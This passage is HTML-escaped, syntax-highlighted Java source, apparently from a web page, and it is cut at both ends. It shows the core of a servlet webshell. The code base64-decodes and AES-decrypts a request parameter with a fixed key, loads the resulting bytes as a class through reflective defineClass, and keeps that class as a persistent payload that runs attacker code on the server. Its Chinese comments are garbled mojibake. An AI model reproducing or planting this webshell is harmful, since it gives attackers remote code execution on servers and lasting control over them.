            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;base64Decode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; bs&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.util.Base64&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; decoder &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;getDecoder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; decoder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;decode&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;decoder&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;bs&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
                base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sun.misc.BASE64Decoder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; decoder &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; decoder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;decodeBuffer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;decoder&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;bs&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;boolean&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;  
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;crypto&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;Cipher&lt;/span&gt; c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;crypto&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;Cipher&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;AES&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            c&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;m &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;crypto&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;SecretKeySpec&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;xc&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getBytes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;AES&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;//æ ¹æ®mçš„å€¼åˆ¤æ–­æ˜¯åŠ å¯†è¿˜æ˜¯è§£å¯†ï¼Œmæ˜¯trueçš„æ—¶å€™å˜é‡ä¸º1ï¼Œè¿™æ—¶å€™è¡¨ç¤ºåŠ å¯†æ¨¡å¼ï¼Œåä¹‹æ˜¯è§£å¯†æ¨¡å¼&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;doFinal&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;defClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; classBytes&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Throwable&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;URLClassLoader&lt;/span&gt; urlClassLoader &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;URLClassLoader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; URL&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;currentThread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getContextClassLoader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; defMethod &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ClassLoader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;defineClass&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        defMethod&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAccessible&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; defMethod&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;urlClassLoader&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; classBytes&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; classBytes&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;length&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token annotation punctuation&quot;&gt;@Override&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;doPost&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HttpServletRequest&lt;/span&gt; req&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;HttpServletResponse&lt;/span&gt; resp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;base64Decode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;req&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pass&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;payload &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;  
                payload &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;defClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;//ç”¨äºç¬¬ä¸€æ¬¡æ¥å—è¯·æ±‚åˆå§‹åŒ–payload&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
                &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;ByteArrayOutputStream&lt;/span&gt; arrOut &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;ByteArrayOutputStream&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;valueOf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;arrOut&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                resp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//                Object f = payload.newInstance(); &lt;/span&gt;
